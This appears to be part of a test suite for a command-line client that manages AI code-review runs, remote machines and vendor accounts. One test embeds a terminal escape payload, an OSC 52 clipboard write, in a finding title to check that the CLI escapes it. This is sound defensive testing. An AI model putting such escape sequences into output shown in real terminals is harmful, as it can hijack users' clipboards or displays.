      projectId: PROJECT_ID,
      boxId: BOX_ID,
      repoPath: "/home/user/src/example/.worktrees/feature",
      tip: "claude/feature",
      base: "origin/main",
      profile: "fast",
      exactBase: true,
      mergeBase: false,
    });
    expect(out).toBe(`Started run ${RUN}.\n`);
  });

  it("starts a whole-project run with exclusions, and refuses post-push", async () => {
    server.on("POST /api/v1/runs", { status: 201, body: runState });
    const args = ["review", "start", "--project", PROJECT_ID, "--repo", "/r", "--whole-project"];
    expect(await cli([...args, "--read-only", "--exclude", "a/**", "b/**"])).toBe(0);
    expect(last()?.body).toMatchObject({
      scope: "whole",
      readOnly: true,
      excludePaths: ["a/**", "b/**"],
    });
    expect(await cli([...args, "--pipeline", "post-push", "--pr", "1"])).not.toBe(0);
  });

  it("passes the round and continuation caps", async () => {
    server.on("POST /api/v1/runs", { status: 201, body: runState });
    const args = ["review", "start", "--project", PROJECT_ID, "--repo", "/r", "--read-only"];
    expect(await cli([...args, "--round-cap", "2", "--continuation-cap", "0"])).toBe(0);
    expect(last()?.body).toMatchObject({ readOnly: true, roundCap: 2, continuationCap: 0 });
    expect(await cli([...args, "--continuation-cap", "-1"])).not.toBe(0);
  });

  it("passes a model tier and refuses an unknown one", async () => {
    server.on("POST /api/v1/runs", { status: 201, body: runState });
    const args = ["review", "start", "--project", PROJECT_ID, "--repo", "/r"];
    expect(await cli(args)).toBe(0);
    expect(last()?.body).toMatchObject({ modelTier: "auto" });
    expect(await cli([...args, "--tier", "small"])).toBe(0);
    expect(last()?.body).toMatchObject({ modelTier: "small" });
    expect(await cli([...args, "--tier", "fable"])).not.toBe(0);
    expect(await cli(args)).toBe(0);
    expect(last()?.body).toMatchObject({ depth: "standard" });
    expect(await cli([...args, "--depth", "thorough", "--verify-floor", "all"])).toBe(0);
    expect(last()?.body).toMatchObject({ depth: "thorough", verifyFloor: "nit" });
    expect(await cli([...args, "--depth", "deep"])).not.toBe(0);
  });

  it("passes starting roles and refuses a bad role", async () => {
    server.on("POST /api/v1/runs", { status: 201, body: runState });
    const args = ["review", "start", "--project", PROJECT_ID, "--repo", "/r"];
    expect(await cli([...args, "--role", "reviewer=codex,copilot", "--role", "fixer=codex"])).toBe(
      0,
    );
    expect(last()?.body).toMatchObject({
      roles: { reviewer: ["codex", "copilot"], fixer: "codex" },
    });
    expect(await cli(args)).toBe(0);
    expect(last()?.body).not.toHaveProperty("roles");
    const calls = server.requests.length;
    for (const bad of [
      ["--role", "disprover=codex,copilot"],
      ["--role", "tester=codex"],
      ["--role", "fixer=gemini"],
      ["--role", "fixer"],
      ["--role", "fixer=codex", "--role", "fixer=claude"],
    ]) {
      expect(await cli([...args, ...bad])).toBe(2);
    }
    expect(server.requests.length).toBe(calls);
    expect(err).toContain("The disprover role takes one vendor.");
  });

  it("refuses a read-only post-push run without calling the server", async () => {
    server.on("POST /api/v1/runs", { status: 201, body: runState });
    const args = ["review", "start", "--project", PROJECT_ID, "--repo", "/r", "--read-only"];
    expect(await cli([...args, "--pipeline", "post-push"])).toBe(2);
    expect(last()).toBeUndefined();
    expect(err).toContain("read-only run can't use the post-push pipeline");
  });

  it("needs a box or a project and repository", async () => {
    expect(await cli(["review", "start"])).toBe(2);
  });

  it("lists runs and shows one with its rounds", async () => {
    server.on("GET /api/v1/runs", { body: { runs: [runState] } });
    await cli(["review", "status"]);
    expect(out).toMatch(/^RUN\s+STATUS/);
    server.on(`GET /api/v1/runs/${RUN}`, { body: runState });
    server.on(`GET /api/v1/runs/${RUN}/rounds`, { body: { rounds: [roundSummary] } });
    out = "";
    await cli(["review", "status", RUN]);
    expect(out).toContain("Reviewers:");
    expect(out).toContain("codex, copilot");
    expect(out).toContain("$1.40");
    expect(out).toContain("codex 2/4");
  });

  it("pauses, resumes, and cancels", async () => {
    for (const verb of ["pause", "resume", "cancel"]) {
      server.on(`POST /api/v1/runs/${RUN}/${verb}`, { body: runState });
      expect(await cli(["review", verb, RUN])).toBe(0);
    }
    expect(server.requests.map((r) => r.path)).toEqual([
      `/api/v1/runs/${RUN}/pause`,
      `/api/v1/runs/${RUN}/resume`,
      `/api/v1/runs/${RUN}/cancel`,
    ]);
  });

  it("pushes a run's branch", async () => {
    server.on(`POST /api/v1/runs/${RUN}/push`, { body: runState });
    expect(await cli(["review", "push", RUN])).toBe(0);
    expect(last()?.body).toEqual({ draft: false });
    expect(out).toContain(`Pushed run ${RUN}`);
    await cli(["review", "push", RUN, "--title", "Fix the mailer", "--draft"]);
    expect(last()?.body).toEqual({ title: "Fix the mailer", draft: true });
    expect(await cli(["review", "push"])).toBe(2);
    out = "";
    expect(await cli(["review", "push", "--help"])).toBe(0);
    expect(out.replace(/\s+/g, " ")).toContain("post-push loop");
  });

  it("assigns roles and switches profiles", async () => {
    server.on(`POST /api/v1/runs/${RUN}/assign`, { body: runState });
    await cli(["review", "assign", RUN, "reviewer", "codex", "claude"]);
    expect(last()?.body).toEqual({ role: "reviewer", vendors: ["codex", "claude"] });
    expect(await cli(["review", "assign", RUN, "boss", "codex"])).toBe(2);
    expect(await cli(["review", "assign", RUN, "fixer", "gemini"])).toBe(2);
    expect(err).toContain("Unknown vendor gemini");
    server.on(`PUT /api/v1/runs/${RUN}/profile`, { body: runState });
    await cli(["review", "profile", RUN, "balanced"]);
    expect(last()?.body).toEqual({ profile: "balanced" });
  });

  it("shows usage against ceilings", async () => {
    server.on("GET /api/v1/usage", {
      body: { vendors: [vendorUsage], time: "2020-01-01T00:00:00.000Z" },
    });
    await cli(["review", "usage"]);
    expect(out).toContain("42%");
    expect(out).toContain("60% of 5h");
  });

  it("shows every window and marks one whose reset has passed", async () => {
    const sample = vendorUsage.latest[0];
    server.on("GET /api/v1/usage", {
      body: {
        time: "2030-06-01T00:00:00.000Z",
        vendors: [
          {
            ...vendorUsage,
            latest: [
              { ...sample, window: "5h", resetAt: "2030-01-01T00:00:00.000Z" },
              { ...sample, window: "7d", resetAt: "2031-01-01T00:00:00.000Z" },
            ],
          },
        ],
      },
    });
    await cli(["review", "usage"]);
    expect(out).toMatch(/5h\s+reset/);
    expect(out).toMatch(/7d\s+42%/);
  });

  it("clears a usage block", async () => {
    server.on("POST /api/v1/usage/clear", { body: { vendors: [], cleared: 1 } });
    await cli(["review", "clear-usage", "codex", "--account", "codex/work"]);
    expect(last()?.body).toEqual({ vendor: "codex", account: "codex/work" });
    expect(out).toContain("Cleared 1 usage blocks");
  });

  it("starts a run with a verification floor", async () => {
    server.on("POST /api/v1/runs", { body: runState });
    await cli(["review", "start", "--project", "p", "--repo", "/r", "--verify-floor", "P2"]);
    expect((last()?.body as { verifyFloor?: string }).verifyFloor).toBe("P2");
    expect(
      await cli(["review", "start", "--project", "p", "--repo", "/r", "--verify-floor", "P0"]),
    ).toBe(2);
  });

  it("retries a run with roles and a floor, and refuses a bad floor", async () => {
    server.on(`POST /api/v1/runs/${RUN}/retry`, { body: runState });
    await cli(["review", "retry", RUN, "--role", "disprover=codex", "--verify-floor", "P2"]);
    expect(last()?.body).toEqual({
      roles: { disprover: "codex" },
      verifyFloor: "P2",
    });
    await cli(["review", "retry", RUN]);
    expect(last()?.body).toEqual({});
    await cli(["review", "retry", RUN, "--verify-floor", "all"]);
    expect(last()?.body).toEqual({ verifyFloor: "all" });
    expect(await cli(["review", "retry", RUN, "--verify-floor", "P0"])).toBe(2);
  });

  it("labels a finding the floor kept from a disprover", async () => {
    server.on(`GET /api/v1/runs/${RUN}/findings`, {
      body: {
        findings: [{ ...finding, verdict: "pending", unverifiedReason: "below_verify_floor" }],
      },
    });
    await cli(["review", "findings", RUN]);
    expect(out).toContain("not verified: below floor");
  });

  it("labels a confirmed finding the floor kept from the fixer", async () => {
    server.on(`GET /api/v1/runs/${RUN}/findings`, {
      body: {
        findings: [{ ...finding, verdict: "confirmed", fixHeldReason: "below_verify_floor" }],
      },
    });
    await cli(["review", "findings", RUN]);
    expect(out).toContain("not sent to the fixer: below floor");
  });

  it("lists findings with filters", async () => {
    server.on(`GET /api/v1/runs/${RUN}/findings`, { body: { findings: [finding] } });
    await cli(["review", "findings", RUN, "--severity", "P1", "--round", "2"]);
    expect(last()?.query).toEqual({ severity: "P1", round: "2" });
    expect(out).toContain("src/mailer.ts:120-134");
  });

  it("shows control characters in model text instead of sending them to the terminal", async () => {
    const osc52 = "\u001b]52;c;U1lOVEhFVElD\u0007";
    const title = `Retry loop ${osc52}never \u009b31m gives up`;
    server.on(`GET /api/v1/runs/${RUN}/findings`, {
      body: { findings: [{ ...finding, title }] },
    });
    await cli(["review", "findings", RUN]);
    expect(out).toContain("Retry loop \\x1b]52;c;U1lOVEhFVElD\\x07never \\x9b31m gives up");
    out = "";
    await cli(["--json", "review", "findings", RUN]);
    // eslint-disable-next-line no-control-regex -- the test looks for raw control characters.
    expect(out).not.toMatch(/[\u0000-\u0008\u000b-\u001f\u007f-\u009f]/);
    expect(JSON.parse(out).findings[0].title).toBe(title);
  });

  it("answers a decision", async () => {
    server.on(`POST /api/v1/runs/${RUN}/decision`, { body: runState });
    expect(await cli(["review", "decide", RUN, "resume_waive"])).toBe(2);
    await cli([
      "review",
      "decide",
      RUN,
      "resume_waive",
      "--waive",
      "F-0001",
      "--reason",
      "Accepted",
    ]);
    expect(last()?.body).toEqual({
      option: "resume_waive",
      waiveFindingIds: ["F-0001"],
      reason: "Accepted",
    });
  });
});

describe("review on other machines", () => {
  const machine = (over: Record<string, unknown>) => ({
    role: "node",
    status: "online",
    isLocal: false,
    serverVersion: "1.0.0",
    protocol: 1,
    capabilities: [],
    lastSeen: "2026-11-01T10:00:00Z",
    platform: "linux",
    ...over,
  });
  const machines = [
    machine({ id: "local", name: "desk", role: "both", isLocal: true }),
    machine({ id: "m1", name: "build-server" }),
    machine({ id: "m2", name: "laptop", status: "offline" }),
    machine({ id: "m3", name: "old-pc", status: "revoked" }),
    machine({ id: "m4", name: "far-pc" }),
    machine({ id: "m5", name: "win-pc", platform: "win32" }),
    machine({ id: "m6", name: "old-node", platform: null }),
  ];
  const proxy = (id: string, rest: string) => `/api/v1/machines/${id}/proxy${rest}`;
  /** Every request path except the machine list that resolves `--machine`. */
  const routed = () => server.requests.map((r) => r.path).filter((p) => p !== "/api/v1/machines");

  beforeEach(() => {
    server.on("GET /api/v1/machines", { body: { machines } });
  });

  it("sends every review command to the machine that --machine names", async () => {
    server.on(`GET ${proxy("m1", "/runs")}`, { body: { runs: [runState] } });
    expect(await cli(["review", "status", "--machine", "m1"])).toBe(0);
    expect(last()?.path).toBe(proxy("m1", "/runs"));
    expect(out).toMatch(/^RUN\s+STATUS/);

    // The option also works before the subcommand.
    server.on(`POST ${proxy("m1", `/runs/${RUN}/pause`)}`, { body: runState });
    expect(await cli(["review", "--machine", "m1", "pause", RUN])).toBe(0);
    expect(last()?.path).toBe(proxy("m1", `/runs/${RUN}/pause`));

    server.on(`GET ${proxy("m1", `/runs/${RUN}/findings`)}`, { body: { findings: [finding] } });
    expect(await cli(["review", "findings", RUN, "--machine", "m1"])).toBe(0);
    expect(last()?.path).toBe(proxy("m1", `/runs/${RUN}/findings`));

    // A machine name works as well as its ID.
    server.on(`GET ${proxy("m1", `/runs/${RUN}`)}`, { body: runState });
    server.on(`GET ${proxy("m1", `/runs/${RUN}/rounds`)}`, { body: { rounds: [] } });
    expect(await cli(["--machine", "build-server", "review", "status", RUN])).toBe(0);
    expect(routed().slice(-2).sort()).toEqual(
      [proxy("m1", `/runs/${RUN}`), proxy("m1", `/runs/${RUN}/rounds`)].sort(),
    );

    // `local` is this machine, with the plain routes.
    server.on("GET /api/v1/runs", { body: { runs: [] } });
    expect(await cli(["review", "status", "--machine", "local"])).toBe(0);
    expect(last()?.path).toBe("/api/v1/runs");

    // The local machine's own name also means the plain routes.
    expect(await cli(["review", "status", "--machine", "desk"])).toBe(0);
    expect(last()?.path).toBe("/api/v1/runs");
  });

  it("refuses a machine that no record names", async () => {
    expect(await cli(["review", "status", "--machine", "nowhere"])).toBe(2);
    expect(err).toContain("No machine has the ID or name nowhere");
    expect(routed()).toEqual([]);
  });

  it("starts a run on another machine from one of its boxes", async () => {
    server.on(`GET ${proxy("m1", `/boxes/${BOX_ID}`)}`, { body: boxView() });
    server.on(`POST ${proxy("m1", "/runs")}`, { status: 201, body: runState });
    expect(await cli(["review", "start", "--machine", "m1", "--box", BOX_ID])).toBe(0);
    expect(routed()).toEqual([proxy("m1", `/boxes/${BOX_ID}`), proxy("m1", "/runs")]);
    expect(last()?.body).toMatchObject({ projectId: PROJECT_ID, boxId: BOX_ID });

    // A MACHINE/BOX argument names the machine too.
    expect(await cli(["review", "start", "--box", `build-server/${BOX_ID}`])).toBe(0);
    expect(routed().slice(-2)).toEqual([proxy("m1", `/boxes/${BOX_ID}`), proxy("m1", "/runs")]);
  });

  it("takes another machine's repository path as given, and maps a Windows one", async () => {
    server.on(`POST ${proxy("m1", "/runs")}`, { status: 201, body: runState });
    const start = (m: string) => ["review", "start", "--machine", m, "--project", PROJECT_ID];
    expect(await cli([...start("m1"), "--repo", "/srv/src/example"], {}, "/home/user")).toBe(0);
    expect(last()?.body).toMatchObject({ repoPath: "/srv/src/example" });

    // A Windows machine's host path maps to its container path, and a
    // container path under /mnt/host passes as given.
    server.on(`POST ${proxy("m5", "/runs")}`, { status: 201, body: runState });
    expect(await cli([...start("m5"), "--repo", "C:\\Users\\user\\example"])).toBe(0);
    expect(last()?.path).toBe(proxy("m5", "/runs"));
    expect(last()?.body).toMatchObject({ repoPath: "/mnt/host/c/Users/user/example" });
    expect(await cli([...start("m5"), "--repo", "/mnt/host/c/src/example"])).toBe(0);
    expect(last()?.body).toMatchObject({ repoPath: "/mnt/host/c/src/example" });

    // A machine that reports no platform gets it from the path's form.
    server.on(`POST ${proxy("m6", "/runs")}`, { status: 201, body: runState });
    expect(await cli([...start("m6"), "--repo", "C:\\Users\\user\\example"])).toBe(0);
    expect(last()?.body).toMatchObject({ repoPath: "/mnt/host/c/Users/user/example" });
    expect(await cli([...start("m6"), "--repo", "/srv/src/example"])).toBe(0);
    expect(last()?.body).toMatchObject({ repoPath: "/srv/src/example" });

    const before = routed().length;
    expect(await cli([...start("m1"), "--repo", "example"])).toBe(2);
    expect(err).toContain("absolute path on build-server");
    // A Linux machine has no drive letters.
    expect(await cli([...start("m1"), "--repo", "C:\\src\\example"])).toBe(2);
    expect(routed()).toHaveLength(before);
  });

  it("reports a machine that can't be reached", async () => {
    server.on(`GET ${proxy("m2", "/runs")}`, {
      status: 503,
      body: { error: { code: "machine_offline", message: "The machine laptop is offline." } },
    });
    expect(await cli(["review", "status", "--machine", "m2"])).toBe(1);
    expect(err).toContain("Error (machine_offline): The machine laptop is offline.");
  });

  it("lists the runs of every machine and shows the unreachable ones as offline", async () => {
    // Only the first five machines, so every online one has an answer.
    server.on("GET /api/v1/machines", { body: { machines: machines.slice(0, 5) } });
    server.on("GET /api/v1/runs", { body: { runs: [runState] } });
    const remoteRun = {
      ...runState,
      id: "01JB8Z5K3W6Q2V9X4T7R0M1N2Q",
      updatedAt: "2026-12-01T00:00:00.000Z",
    };
    server.on(`GET ${proxy("m1", "/runs")}`, { body: { runs: [remoteRun] } });
    server.on(`GET ${proxy("m4", "/runs")}`, {
      status: 504,
      body: { error: { code: "machine_timeout", message: "far-pc didn't answer in time." } },
    });

    expect(await cli(["review", "status", "--all-machines", "--project", PROJECT_ID])).toBe(0);
    const paths = server.requests.map((r) => r.path);
    // No call to the offline or the revoked machine.
    expect(paths).not.toContain(proxy("m2", "/runs"));
    expect(paths).not.toContain(proxy("m3", "/runs"));
    expect(server.requests.find((r) => r.path === proxy("m1", "/runs"))?.query).toEqual({
      projectId: PROJECT_ID,
    });
    const lines = out.split("\n");
    expect(lines[0]).toMatch(/^MACHINE\s+RUN\s+STATUS/);
    // Newest first, each with its machine's name.
    expect(lines[1]).toMatch(/^build-server\s+01JB8Z5K3W6Q2V9X4T7R0M1N2Q/);
    expect(lines[2]).toMatch(new RegExp(`^desk\\s+${RUN}`));
    expect(out).toContain("laptop: offline. The hub reports it offline.");
    expect(out).toContain("far-pc: offline. far-pc didn't answer in time.");

    out = "";
    expect(await cli(["--json", "review", "status", "--all-machines"])).toBe(0);
    const json = JSON.parse(out) as { machines: { id: string; status: string; runs: unknown[] }[] };
    expect(json.machines.map((m) => [m.id, m.status, m.runs.length])).toEqual([
      ["local", "online", 1],
      ["m1", "online", 1],
      ["m2", "offline", 0],
      ["m4", "offline", 0],
    ]);
  });

  it("fails an all-machines run list when another machine answers with an error", async () => {
    server.on("GET /api/v1/machines", { body: { machines: machines.slice(0, 2) } });
    server.on("GET /api/v1/runs", { body: { runs: [runState] } });
    server.on(`GET ${proxy("m1", "/runs")}`, {
      status: 500,
      body: { error: { code: "internal", message: "The node failed." } },
    });

    expect(await cli(["review", "status", "--all-machines"])).toBe(1);
    expect(out).toMatch(new RegExp(`^desk\\s+${RUN}`, "m"));
    expect(out).toContain("build-server: error. The node failed.");
  });

  it("fails an all-machines run list when this server's own list fails", async () => {
    server.on("GET /api/v1/machines", { body: { machines: machines.slice(0, 2) } });
    server.on("GET /api/v1/runs", {
      status: 500,
      body: { error: { code: "internal", message: "The server failed." } },
    });
    server.on(`GET ${proxy("m1", "/runs")}`, { body: { runs: [runState] } });

    expect(await cli(["review", "status", "--all-machines"])).toBe(1);
    expect(err).toContain("Error (internal): The server failed.");
    expect(out).toBe("");
  });

  it("fails an all-machines run list when the server stops answering", async () => {
    const failing: typeof fetch = async (input) => {
      if (String(input).endsWith("/api/v1/machines")) {
        return Response.json({ machines: machines.slice(0, 2) });
      }
      throw Object.assign(new TypeError("fetch failed"), { cause: { code: "ECONNREFUSED" } });
    };
    const code = await runCli(["review", "status", "--all-machines"], {
      env: { AIO_SERVER: "https://example.com", AIO_TOKEN: TOKEN },
      home,
      fetch: failing,
      out: (t) => (out += t),
      err: (t) => (err += t),
    });

    expect(code).toBe(1);
    expect(err).toContain("ECONNREFUSED");
    expect(out).toBe("");
  });

  it("exits 130 when an all-machines run list is interrupted", async () => {
    const controller = new AbortController();
    server.on("GET /api/v1/machines", { body: { machines: machines.slice(0, 2) } });
    server.on("GET /api/v1/runs", { body: { runs: [runState] } });
    server.on(`GET ${proxy("m1", "/runs")}`, () => {
      controller.abort();
      return { body: { runs: [runState] } };
    });

    const args = ["review", "status", "--all-machines"];
    expect(await cli(args, {}, undefined, controller.signal)).toBe(130);
    expect(err).toBe("Interrupted.\n");
    expect(out).toBe("");
  });

  it("refuses --all-machines with a run ID or with --machine", async () => {
    expect(await cli(["review", "status", RUN, "--all-machines"])).toBe(2);
    expect(await cli(["review", "status", "--all-machines", "--machine", "m1"])).toBe(2);
    expect(await cli(["--machine", "m1", "review", "status", "--all-machines"])).toBe(2);
    expect(server.requests).toHaveLength(0);
  });

  it("tails another machine's event stream", async () => {
    server.events = [
      {
        id: "e1",
        time: "2026-10-28T09:00:00.000Z",
        source: `engine:${CONTAINER}`,
        streamId: "srv-1",
        seq: 1,
        sourceSeq: 4,
        type: "ports.changed",
        container: CONTAINER,
        listeners: [],
        machine: "m1",
      },
    ];
    expect(await cli(["events", "--machine", "m1", "--count", "1"])).toBe(0);
    expect(out).toContain('"machine":"m1"');
    expect(server.eventPaths).toEqual([proxy("m1", "/events")]);
  });
});

describe("relative paths", () => {
  const CWD = "/home/user/src/example";

  it("resolves them against the CLI's working directory before sending", async () => {
    server.on("POST /api/v1/boxes", { status: 202, body: job("running") });
    await cli(["box", "new", ".", "--layout", "root", "--no-wait"], {}, CWD);
    expect(last()?.body).toMatchObject({ targetDir: CWD });

    server.on(`PATCH /api/v1/projects/${PROJECT_ID}`, {
      body: { project, staleBoxes: [] },
    });
    await cli(
      [
        "project",
        "set",
        PROJECT_ID,
        "--primary-repo",
        "../repo",
        "--mount",
        "data",
        "--mount",
        "cache:/cache",
      ],
      {},
      CWD,
    );
    expect(last()?.body).toEqual({
      primaryRepo: "/home/user/src/repo",
      mounts: [
        { host: `${CWD}/data`, container: `${CWD}/data` },
        { host: `${CWD}/cache`, container: "/cache" },
      ],
    });

    server.on("POST /api/v1/runs", { status: 201, body: runState });
    await cli(["review", "start", "--project", PROJECT_ID, "--repo", "."], {}, CWD);
    expect(last()?.body).toMatchObject({ repoPath: CWD });
  });
});

describe("accounts", () => {
  const T = "2026-10-31T09:00:00Z";
  const view = (id: string, isDefault = false) => {
    const [vendor, name] = id.split("/") as [string, string];
    return {
      account: {
        id,
        vendor,
        name,
        label: name,
        overflow: false,
        signIn: { state: "not_signed_in" },
        createdAt: T,
        updatedAt: T,
      },
      dir: `/home/user/.ai-orchestrator/accounts/${id}`,
      dirExists: true,
      isDefault,
    };
  };
  const seedJob = (status: "running" | "finished", result: unknown = null) => ({
    ...job(status),
    kind: "account_seed",
    boxId: null,
    result,
  });
  const entry = {
    vendor: "claude",
    reason: null,
    files: 10,
    bytes: 2 * 1024 * 1024,
    symlinks: 1,
    leftOut: [".credentials.json"],
    skippedSpecial: [],
    madeDefault: true,
    usageRelabeled: 4,
  };
  const report = {
    dryRun: false,
    accounts: [
      {
        ...entry,
        id: "claude/personal",
        source: "/home/user/.claude",
        dir: "/home/user/.ai-orchestrator/accounts/claude/personal",
        status: "seeded",
      },
      {
        ...entry,
        id: "copilot/personal",
        vendor: "copilot",
        source: "/home/user/.copilot",
        dir: "/home/user/.ai-orchestrator/accounts/copilot/personal",
        status: "skipped",
        reason: "/home/user/.copilot isn't a folder.",
        files: 0,
        bytes: 0,
        symlinks: 0,
        leftOut: [],
        madeDefault: false,
        usageRelabeled: 0,
      },
    ],
  };

  it("lists accounts as a table", async () => {
    server.on("GET /api/v1/accounts", {
      body: { accounts: [view("claude/personal", true), view("codex/work")] },
    });
    expect(await cli(["accounts", "list"])).toBe(0);
    expect(out.split("\n")[0]).toMatch(/^ACCOUNT\s+LABEL\s+DEFAULT\s+SIGN-IN\s+FOLDER/);
    expect(out).toContain("claude/personal");
    expect(out).toContain("not signed in");
  });

  it("adds an account and checks its vendor", async () => {
    server.on("POST /api/v1/accounts", { status: 201, body: view("codex/work", true) });
    expect(await cli(["accounts", "add", "codex", "work", "--label", "Work"])).toBe(0);
    expect(last()?.body).toEqual({ vendor: "codex", name: "work", label: "Work", overflow: false });
    expect(out).toContain("Created codex/work");
    expect(await cli(["accounts", "add", "gemini", "work"])).toBe(2);
  });

  it("imports a folder as an account and prints the copy warning", async () => {
    server.on("POST /api/v1/accounts/import", {
      status: 201,
      body: { ...view("claude/work"), mode: "copied", warnings: ["Keep only one copy in use."] },
    });
    expect(
      await cli(["accounts", "import", "claude", "work", "--from", "/data/acct", "--copy"]),
    ).toBe(0);
    expect(last()?.body).toMatchObject({
      vendor: "claude",
      name: "work",
      from: "/data/acct",
      copy: true,
    });
    expect(out).toContain("Copied the folder");
    expect(out).toContain("Warning: Keep only one copy in use.");
    expect(out).toContain("accounts check claude/work");
    expect(await cli(["accounts", "import", "claude", "work"])).toBe(2);
  });

  it("prints the transcript link warnings of accounts check, and the relink result", async () => {
    server.on("POST /api/v1/accounts/claude/work/check", {
      status: 200,
      body: {
        ...view("claude/work"),
        warnings: ["projects is a link to a folder that doesn't exist."],
      },
    });
    expect(await cli(["accounts", "check", "claude/work"])).toBe(0);
    expect(out).toContain("Warning: projects is a link to a folder that doesn't exist.");
    server.on("POST /api/v1/accounts/relink", {
      status: 200,
      body: {
        store: "/home/me/.ai-orchestrator/transcripts/claude",
        source: "data",
        accounts: [
          {
            id: "claude/work",
            before: "dangling",
            outcome: "replaced",
            config: { entries: { "settings.json": "linked", skills: "local" }, errors: {} },
          },
        ],
      },
    });
    expect(await cli(["accounts", "relink"])).toBe(0);
    expect(out).toContain("/home/me/.ai-orchestrator/transcripts/claude (data)");
    expect(out).toContain("claude/work: dangling -> replaced.");
    expect(out).toContain("Linked to the host: settings.json.");
    expect(out).toContain("Local overrides, left alone: skills.");
  });

  it("adopts the host's transcripts, with a dry run and a blocked exit code", async () => {
    server.on("POST /api/v1/transcripts/adopt", {
      status: 200,
      body: {
        store: "/home/me/.ai-orchestrator/transcripts/claude",
        dryRun: true,
        status: "adopted",
        moved: 3,
        duplicates: 1,
        clashes: [],
        actions: ["Would repoint the link /home/me/.claude/projects at the store."],
      },
    });
    expect(await cli(["transcripts", "adopt", "--dry-run"])).toBe(0);
    expect(last()?.body).toEqual({ dryRun: true });
    expect(out).toContain("3 file(s) moved, 1 already in the store (dry run)");
    server.on("POST /api/v1/transcripts/adopt", {
      status: 200,
      body: {
        store: "/s",
        dryRun: false,
        status: "blocked",
        moved: 0,
        duplicates: 0,
        clashes: ["-a/u.jsonl"],
        actions: ["1 file(s) exist in both places."],
      },
    });
    expect(await cli(["transcripts", "adopt"])).toBe(1);
    expect(out).toContain("Clash: -a/u.jsonl");
  });

  it("passes --account choices to box new, one per vendor", async () => {
    server.on("POST /api/v1/boxes", { status: 202, body: job("running") });
    await cli([
      "box",
      "new",
      "/d",
      "--account",
      "claude/work",
      "--account",
      "codex/main",
      "--no-wait",
    ]);
    expect(last()?.body).toMatchObject({
      accounts: { claude: "claude/work", codex: "codex/main" },
    });
    expect(await cli(["box", "new", "/d", "--account", "claude/a", "--account", "claude/b"])).toBe(
      2,
    );
    expect(await cli(["box", "new", "/d", "--account", "work"])).toBe(2);
  });

  it("sets and clears a box's account", async () => {
    server.on(`PATCH /api/v1/boxes/${BOX_ID}`, {
      status: 400,
      body: { error: { code: "validation", message: "stop here" } },
    });
    await cli(["box", "account", BOX_ID, "claude/work"]);
    expect(last()?.body).toEqual({ accounts: { claude: "claude/work" } });
    await cli(["box", "account", BOX_ID, "codex"]);
    expect(last()?.body).toEqual({ accounts: { codex: null } });
    expect(await cli(["box", "account", BOX_ID, "gemini"])).toBe(2);
  });

  it("describes stored host mode as retired and offers only account mode", async () => {
    server.on("GET /api/v1/settings", { body: parseConfig({ accountsMode: "host" }) });
    expect(await cli(["accounts", "mode"])).toBe(0);
    expect(out).toContain("Host mode is retired");
    expect(out).toContain("aio accounts mode accounts");
    expect(await cli(["accounts", "mode", "host"])).toBe(2);
  });

  it("sets the accounts mode through the settings", async () => {
    server.on("PATCH /api/v1/settings", {
      status: 400,
      body: { error: { code: "validation", message: "stop here" } },
    });
    await cli(["accounts", "mode", "accounts"]);
    expect(last()?.body).toEqual({ accountsMode: "accounts" });
    expect(await cli(["accounts", "mode", "both"])).toBe(2);
  });

  it("prints a Copilot sign-in with --device-code", async () => {
    server.on("GET /api/v1/accounts/copilot/work", { body: view("copilot/work") });
    expect(await cli(["accounts", "login", "copilot/work"])).toBe(0);
    expect(out).toContain(
      "COPILOT_HOME=/home/user/.ai-orchestrator/accounts/copilot/work copilot login --device-code",
    );
  });

  it("makes an account the default through the settings", async () => {
    let patched: unknown;
    server.on("PATCH /api/v1/settings", (req) => {
      patched = req.body;
      return { status: 400, body: { error: { code: "validation", message: "stop here" } } };
    });
    await cli(["accounts", "set", "claude/work", "--default"]);
    expect(patched).toEqual({ accountDefaults: { claude: "claude/work" } });
    expect(await cli(["accounts", "set", "claude/work"])).toBe(2);
    expect(await cli(["accounts", "set", "work", "--default"])).toBe(2);
  });

  it("removes an account and says the folder stays", async () => {
    server.on("DELETE /api/v1/accounts/codex/work", {
      body: { keptDir: "/home/user/.ai-orchestrator/accounts/codex/work" },
    });
    expect(await cli(["accounts", "remove", "codex/work"])).toBe(0);
    expect(out).toContain("Its folder stays at /home/user/.ai-orchestrator/accounts/codex/work");
  });

  it("seeds accounts, waits for the job, and prints the report", async () => {
    server.on("POST /api/v1/accounts/seed", { status: 202, body: seedJob("running") });
    let polls = 0;
    server.on("GET /api/v1/jobs/job-1", () => ({
      body: ++polls < 2 ? seedJob("running") : seedJob("finished", report),
    }));
    expect(await cli(["accounts", "seed", "--vendor", "claude", "--vendor", "copilot"])).toBe(0);
    expect(server.requests.find((r) => r.method === "POST")?.body).toEqual({
      vendors: ["claude", "copilot"],
      name: "personal",
      dryRun: false,
      copyHostSetup: false,
    });
    expect(out).toContain("Seeded claude/personal from /home/user/.claude: 10 files (2.0 MiB)");
    expect(out).toContain("Left out: .credentials.json.");
    expect(out).toContain("Skipped copilot/personal");
    expect(out).toContain("Copied available host sign-ins.");
    expect(out).toContain(
      "using a copied sign-in on both the host and an account can sign out either copy",
    );
    expect(out).toContain("Sign in separately to each account");
  });

  it("opts into a one-time host setup copy only when requested", async () => {
    server.on("POST /api/v1/accounts/seed", { status: 202, body: seedJob("finished", report) });
    expect(await cli(["accounts", "seed", "--copy-host-setup"])).toBe(0);
    expect(last()?.body).toMatchObject({ copyHostSetup: true });
  });

  it("passes a refusal through", async () => {
    server.on("POST /api/v1/accounts/seed", {
      status: 409,
      body: { error: { code: "box_running", message: "Stop every box before you seed accounts." } },
    });
    expect(await cli(["accounts", "seed", "--dry-run"])).toBe(1);
    expect(last()?.body).toMatchObject({ dryRun: true });
    expect(err).toContain("Stop every box");
  });

  it("refuses an unknown vendor without calling the server", async () => {
    expect(await cli(["accounts", "seed", "--vendor", "gemini"])).toBe(2);
    expect(server.requests).toHaveLength(0);
  });
});

describe("migrate, setup, doctor", () => {
  it("calls the import route", async () => {
    const report = {
      dryRun: true,
      projects: 1,
      boxes: 3,
      sshRemotes: 0,
      settingsApplied: true,
      warnings: ["Skipped the record x: no target_dir."],
    };
    server.on("POST /api/v1/import", { body: report });
    expect(await cli(["migrate", "--dry-run"])).toBe(0);
    expect(last()?.body).toEqual({ dryRun: true });
    expect(out).toContain(
      "Would import 1 projects, 3 boxes, 0 SSH remotes, and the global settings.",
    );
    expect(out).toContain("Warning: Skipped the record x: no target_dir.");
    expect(await cli(["migrate", "--json"])).toBe(0);
    expect(JSON.parse(out.slice(out.indexOf("{")))).toEqual(report);
  });

